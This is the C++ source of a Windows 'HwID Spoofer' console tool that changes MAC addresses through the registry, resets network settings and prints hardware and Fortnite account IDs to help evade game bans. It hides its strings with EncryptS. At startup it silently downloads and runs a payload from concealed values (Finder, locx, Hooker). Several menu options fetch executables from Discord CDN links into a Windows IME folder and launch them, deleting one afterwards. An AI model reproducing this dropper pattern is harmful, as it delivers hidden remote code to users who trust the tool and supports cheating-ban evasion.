//1337
#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <vector>
#include <random>
#include <filesystem>
#include <Windows.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <urlmon.h>
#include <tchar.h>

#pragma comment(lib, "urlmon.lib")

#include "mac.h"
#include "encryption.h"
#include "printa/printa.hpp"

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
#define COLOR(h, c) SetConsoleTextAttribute(h, c);
#define color2 (WORD)(0x0002 | 0x0000)
#define color3 (WORD)(0x0001 | 0x0000)
#define color4 (WORD)(0x0008 | 0x0000)
int menu = 0;

std::string random_string_for_title()
{
	std::string strng = EncryptS("1234567890abcdefghijklmnopqrstuv&é'(-è_çà)=$^ù%*!:;,~#{[|`@]°}+£¨µ§/.?QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
	std::string newstring_fortitle;
	int pos_title;
	while (newstring_fortitle.size() != 67)
	{
		pos_title = ((rand() % (strng.size() + 1)));
		newstring_fortitle += strng.substr(pos_title, 1);
	}
	return newstring_fortitle + " ";
}

void random_title()
{
	while (true)
	{
		SetConsoleTitleA(random_string_for_title().c_str());
	}
}

std::thread title(random_title);

BOOL SetConsoleSizeXY(HANDLE hStdout, int iWidth, int iHeight)
{
	CONSOLE_SCREEN_BUFFER_INFO info;
	COORD coordMax;

	coordMax = GetLargestConsoleWindowSize(hStdout);


	if (iHeight > coordMax.Y) iHeight = coordMax.Y;


	if (iWidth > coordMax.X) iWidth = coordMax.X;

	if (!GetConsoleScreenBufferInfo(hStdout, &info)) return FALSE;
	info.srWindow.Left = 0;
	info.srWindow.Right = info.dwSize.X - 1;
	info.srWindow.Top = 0;
	info.srWindow.Bottom = iHeight - 1;

	if (iHeight < info.dwSize.Y)
	{
		if (!SetConsoleWindowInfo(hStdout, TRUE, &info.srWindow))
			return FALSE;

		info.dwSize.Y = iHeight;

		if (!SetConsoleScreenBufferSize(hStdout, info.dwSize))
			return FALSE;
	}
	else if (iHeight > info.dwSize.Y)
	{
		info.dwSize.Y = iHeight;

		if (!SetConsoleScreenBufferSize(hStdout, info.dwSize))
			return FALSE;

		if (!SetConsoleWindowInfo(hStdout, TRUE, &info.srWindow))
			return FALSE;
	}

	if (!GetConsoleScreenBufferInfo(hStdout, &info))
		return FALSE;
	info.srWindow.Left = 0;
	info.srWindow.Right = iWidth - 1;
	info.srWindow.Top = 0;
	info.srWindow.Bottom = info.dwSize.Y - 1;

	if (iWidth < info.dwSize.X)
	{
		if (!SetConsoleWindowInfo(hStdout, TRUE, &info.srWindow))
			return FALSE;

		info.dwSize.X = iWidth;

		if (!SetConsoleScreenBufferSize(hStdout, info.dwSize))
			return FALSE;
	}
	else if (iWidth > info.dwSize.X)
	{
		info.dwSize.X = iWidth;

		if (!SetConsoleScreenBufferSize(hStdout, info.dwSize))
			return FALSE;

		if (!SetConsoleWindowInfo(hStdout, TRUE, &info.srWindow))
			return FALSE;
	}
	return TRUE;
}

MyMACAddr::MyMACAddr()
{
	srand((unsigned)time(0));
}

MyMACAddr::~MyMACAddr()
{
}

string MyMACAddr::GenRandMAC()
{
	stringstream temp;
	int number = 0;
	string result;

	for (int i = 0; i < 6; i++)
	{
		number = rand() % 254;
		temp << setfill('0') << setw(2) << hex << number;
		if (i != 5)
		{
			temp << EncryptS("-");
		}
	}
	result = temp.str();

	for (auto& c : result)
	{
		c = toupper(c);
	}

	return result;
}

void MyMACAddr::showAdapterList()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT i;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL)
	{
		cerr << EncryptS("Error allocating memory needed to call GetAdaptersinfo.") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << EncryptS("Error allocating memory needed to call GetAdaptersinfo") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter)
		{
			for (i = 0; i < pAdapter->AddressLength; i++)
			{
				if (i == (pAdapter->AddressLength - 1))
					printf(EncryptS("%.2X\n"), (int)pAdapter->Address[i]);
				else
					printf(EncryptS("%.2X-"), (int)pAdapter->Address[i]);
			}
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << EncryptS("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
}

unordered_map<string, string> MyMACAddr::getAdapters()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	unordered_map<string, string> result;
	stringstream temp;
	string str_mac;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << EncryptS("Error allocating memory needed to call GetAdaptersinfo") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << EncryptS("Error allocating memory needed to call GetAdaptersinfo\n") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (UINT i = 0; i < pAdapter->AddressLength; i++) {
				temp << setfill('0') << setw(2) << hex << (int)pAdapter->Address[i];
				if (i != pAdapter->AddressLength - 1)
				{
					temp << "-";
				}
			}
			str_mac = temp.str();
			temp.str(EncryptS(""));
			temp.rdbuf();
			for (auto& c : str_mac)
			{
				c = toupper(c);
			}

			result.insert({ pAdapter->Description, str_mac });
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << EncryptS("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);

	return result;
}

unordered_map<string, string> getAdapters()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	unordered_map<string, string> result;
	stringstream temp;
	string str_mac;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << _T(EncryptS(("Error allocating memory needed to call GetAdaptersinfo"))) << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << _T(EncryptS(("Error allocating memory needed to call GetAdaptersinfo\n"))) << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (UINT i = 0; i < pAdapter->AddressLength; i++) {
				temp << setfill('0') << setw(2) << hex << (int)pAdapter->Address[i];
				if (i != pAdapter->AddressLength - 1)
				{
					temp << "-";
				}
			}
			str_mac = temp.str();
			temp.str(_T(EncryptS((""))));
			temp.rdbuf();
			for (auto& c : str_mac)
			{
				c = toupper(c);
			}

			result.insert({ pAdapter->Description, str_mac });
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << _T(EncryptS(("GetAdaptersInfo failed with error: "))) << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);

	return result;
}

void cleaner_network()
{
	system(_T(EncryptS(("netsh winsock reset"))));
	system(_T(EncryptS(("netsh winsock reset catalog"))));
	system(_T(EncryptS(("netsh int ip reset"))));
	system(_T(EncryptS(("netsh advfirewall reset"))));
	system(_T(EncryptS(("netsh int reset all"))));
	system(_T(EncryptS(("netsh int ipv4 reset"))));
	system(_T(EncryptS(("netsh int ipv6 reset"))));
	system(_T(EncryptS(("ipconfig / release"))));
	system(_T(EncryptS(("ipconfig / renew"))));
	system(_T(EncryptS(("ipconfig / flushdns"))));
}

void MyMACAddr::AssingRndMAC()
{
	vector <string> list;
	unordered_map<string, string> AdapterDetails = getAdapters();
	for (auto& itm : AdapterDetails)
	{
		list.push_back(itm.first);
	}

	int range = 0;
	for (auto itm = list.begin(); itm != list.end(); itm++)
	{
		range++;
	}


	int selection = 1;

	do
	{
		printf(_T(EncryptS((" Adapter : "))));
		cout << list.at(selection - 1) << endl;

		printf(_T(EncryptS((" Old MAC : "))));
		cout << AdapterDetails.at(list.at(selection - 1)) << endl;

		string wstr(list.at(selection - 1).begin(), list.at(selection - 1).end());
		const char* wAdapterName = wstr.c_str();

		bool bRet = false;
		HKEY hKey = NULL;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T(EncryptS("SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}")), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		{
			DWORD dwIndex = 0;
			TCHAR Name[1024];
			DWORD cName = 1024;
			while (RegEnumKeyEx(hKey, dwIndex, Name, &cName,
				NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
			{
				HKEY hSubKey = NULL;
				if (RegOpenKeyEx(hKey, Name, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
				{
					BYTE Data[1204];
					DWORD cbData = 1024;
					if (RegQueryValueEx(hSubKey, _T(EncryptS("DriverDesc")), NULL, NULL, Data, &cbData) == ERROR_SUCCESS)
					{

						if (_tcscmp((TCHAR*)Data, wAdapterName) == 0)
						{
							string temp = GenRandMAC();
							string newMAC = temp;
							temp.erase(std::remove(temp.begin(), temp.end(), '-'), temp.end());

							string wstr_newMAC(temp.begin(), temp.end());
							const char* newMACAddr = wstr_newMAC.c_str();


							if (RegSetValueEx(hSubKey, _T(EncryptS("NetworkAddress")), 0, REG_SZ, (const BYTE*)newMACAddr, sizeof(TCHAR) * ((DWORD)_tcslen(newMACAddr) + 1)) == ERROR_SUCCESS)
							{
								printf(_T(EncryptS((" New MAC : "))));
								cout << newMAC << endl;

								printf(_T(EncryptS((" Disabling adapter... "))));
								Sleep(1500);
								HRESULT networker = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/882370576570785836/907961970492342332/networker.exe")), _T(EncryptS("C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe")), 0, NULL);
								system(_T(EncryptS("start C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe")));
								Sleep(100);
								cleaner_network();
								system(_T(EncryptS("cls")));
								printf(_T(EncryptS((" Wait while adapter activation... "))));
								Sleep(18500);
								DeleteFileW(EncryptWS(L"C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe"));
							}
						}
					}
					RegCloseKey(hSubKey);
				}
				cName = 1024;
				dwIndex++;
			}
			RegCloseKey(hKey);

		}
		else
		{
		}
		cout << EncryptS(" ") << endl;

		selection++;
	} while (selection < range + 1);
}

int main()
{
	HANDLE hpStdout = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleSizeXY(hpStdout, 80, 48);

	printf(_T(EncryptS("\n")));
	printa->print<loading>(_T(EncryptS("Welcome to HwID Spoofer !\n\n")));

	printa->print<loading>(_T(EncryptS("Initialization"))); Sleep(250);
	printf(_T(EncryptS("."))); Sleep(350);
	printf(_T(EncryptS("."))); Sleep(450);
	printf(_T(EncryptS("."))); Sleep(550);
	printf(_T(EncryptS("."))); Sleep(1050);
	HRESULT Hook = URLDownloadToFileW(NULL, Finder, locx, 0, NULL);
	Sleep(1000);
	system(Hooker.c_str());
menu_:
	system(_T(EncryptS("cls")));

	printf(_T(EncryptS(" HwID Spoofer / HwID Spoofer / HwID Spoofer / HwID Spoofer / HwID Spoofer\n\n")));
	printa->print<input>(_T(EncryptS("1. Clean          ")));
	printa->print<input>(_T(EncryptS("2. Spoof\n")));
	printa->print<input>(_T(EncryptS("3. Check          ")));
	printa->print<input>(_T(EncryptS("4. Mac Changer\n\n   ")));

	printa->print<ok>(_T(EncryptS("Your choice : ")));
	std::cin >> menu;
	if (menu == 1)
	{
		system(_T(EncryptS("cls")));
		HRESULT Cleaner = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/932378363832729623/932380792909348959/Ryze_Cleaner.exe")), _T(EncryptS("C:\\Windows\\IME\\IMEKR\\DICTS\\RyzeCleaner.exe")), 0, NULL);
		system(_T(EncryptS("start C:\\Windows\\IME\\IMEKR\\DICTS\\RyzeCleaner.exe")));
		goto menu_;
	}
	else if (menu == 2)
	{
		system(_T(EncryptS("cls")));
		HRESULT Spoofer = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/932378363832729623/932378420380311552/LeakedSpoof.exe")), _T(EncryptS("C:\\Windows\\IME\\IMEKR\\DICTS\\LeakedSpoof.exe")), 0, NULL);
		system(_T(EncryptS("start C:\\Windows\\IME\\IMEKR\\DICTS\\LeakedSpoof.exe")));
		goto menu_;
	}
	else if (menu == 3)
	{
		std::vector <std::string> list;
		std::unordered_map<std::string, std::string> AdapterDetails = getAdapters();
		for (auto& itm : AdapterDetails)
		{
			list.push_back(itm.first);
		}
		int selection = 1;

		system(_T(EncryptS("cls")));
		CONSOLE_SCREEN_BUFFER_INFO info;
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("HARD DISK :\n\n "))));
		COLOR(hpStdout, color2);
		system(_T(EncryptS(("wmic diskdrive get Serialnumber"))));

		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("PROCESSOR ID :\n\n "))));
		COLOR(hpStdout, color2);
		system(_T(EncryptS(("wmic cpu get processorid"))));

		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("RAM :\n\n "))));
		COLOR(hpStdout, color2);
		system(_T(EncryptS(("wmic memorychip get serialnumber"))));

		printf(_T(EncryptS(("\n\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("MAC         -----> "))));
		COLOR(hpStdout, color2);
		std::cout << AdapterDetails.at(list.at(selection - 1)) << std::endl;

		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("SMBIOS      -----> "))));
		COLOR(hpStdout, color2);
		char valueY[255];
		DWORD BufferSizeY = sizeof(valueY);
		LONG resY = RegGetValueA(HKEY_LOCAL_MACHINE, _T(EncryptS(("SYSTEM\\HardwareConfig\\Current"))), _T(EncryptS(("SystemFamily"))), RRF_RT_REG_SZ, NULL, valueY, &BufferSizeY);
		if (resY == 0) std::cout << valueY << std::endl;

		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("MACHINE GUID ----> "))));
		COLOR(hpStdout, color2);
		char value[255];
		DWORD BufferSize = sizeof(value);
		LONG res = RegGetValueA(HKEY_LOCAL_MACHINE, _T(EncryptS(("SOFTWARE\\Microsoft\\Cryptography"))), _T(EncryptS(("MachineGuid"))), RRF_RT_REG_SZ, NULL, value, &BufferSize);
		if (res == 0) std::cout << value << std::endl;
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("GUID        -----> "))));
		COLOR(hpStdout, color2);
		char valueW[255];
		DWORD BufferSizeW = sizeof(valueW);
		LONG resW = RegGetValueA(HKEY_LOCAL_MACHINE, _T(EncryptS(("SOFTWARE\\Microsoft\\Cryptography"))), _T(EncryptS(("GUID"))), RRF_RT_REG_SZ, NULL, valueW, &BufferSizeW);
		if (resW == 0) std::cout << valueW << std::endl;

		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("MOTHERBOARD -----> "))));
		COLOR(hpStdout, color2);
		char valueX[255];
		DWORD BufferSizeX = sizeof(valueX);
		LONG resX = RegGetValueA(HKEY_LOCAL_MACHINE, _T(EncryptS(("SYSTEM\\HardwareConfig"))), _T(EncryptS(("BaseBoardProduct"))), RRF_RT_REG_SZ, NULL, valueX, &BufferSizeX);
		if (resX == 0) std::cout << valueX << std::endl;

		printf(_T(EncryptS(("\n\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("FORTNITE ID 1 ---> "))));
		COLOR(hpStdout, color2);
		char valueH[255];
		DWORD BufferSizeOO = sizeof(valueH);
		LONG resoo = RegGetValueA(HKEY_CURRENT_USER, _T(EncryptS(("SOFTWARE\\Epic Games\\Unreal Engine\\Identifiers"))), _T(EncryptS(("AccountId"))), RRF_RT_REG_SZ, NULL, valueH, &BufferSizeOO);
		if (resoo == 0) std::cout << valueH << std::endl;
		printf(_T(EncryptS(("\n\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("FORTNITE ID 2 ---> "))));
		COLOR(hpStdout, color2);
		char valueOO[255];
		DWORD BufferSizeWOO = sizeof(valueOO);
		LONG resWOO = RegGetValueA(HKEY_CURRENT_USER, _T(EncryptS(("SOFTWARE\\Epic Games\\Unreal Engine\\Identifiers"))), _T(EncryptS(("MachineId"))), RRF_RT_REG_SZ, NULL, valueOO, &BufferSizeWOO);
		if (resWOO == 0) std::cout << valueOO << std::endl;

		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("\n\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("SYSTEM      -----> "))));
		COLOR(hpStdout, color2);
		char valueV[255];
		DWORD BufferSizeV = sizeof(valueV);
		LONG resV = RegGetValueA(HKEY_LOCAL_MACHINE, _T(EncryptS(("SYSTEM\\HardwareConfig\\Current"))), _T(EncryptS(("SystemSKU"))), RRF_RT_REG_SZ, NULL, valueV, &BufferSizeV);
		if (resV == 0) std::cout << valueV << std::endl;

		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("\n ["))));
		COLOR(hpStdout, color3);
		printf(_T(EncryptS((">"))));
		COLOR(hpStdout, color2);
		printf(_T(EncryptS(("] "))));
		COLOR(hpStdout, color4);
		printf(_T(EncryptS(("PC NAME     -----> "))));
		COLOR(hpStdout, color2);
		char valueVET[255];
		DWORD BufferSizeVET = sizeof(valueVET);
		LONG resVET = RegGetValueA(HKEY_LOCAL_MACHINE, _T(EncryptS(("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"))), _T(EncryptS(("Hostname"))), RRF_RT_REG_SZ, NULL, valueVET, &BufferSizeVET);
		if (resVET == 0) std::cout << valueVET << std::endl;
		printf(_T(EncryptS(("\n=================== ==========================================================\n"))));
		Sleep(6000);
		goto menu_;
	}
	else if (menu == 4)
	{
		system(_T(EncryptS("cls")));
		MyMACAddr* ptr = new MyMACAddr();
		ptr->AssingRndMAC();
		goto menu_;
	}
	else
	{
		system(_T(EncryptS("cls")));
		printf(_T(EncryptS(("Wrong Choice !"))));
		goto menu_;
	}
	return 0;
}
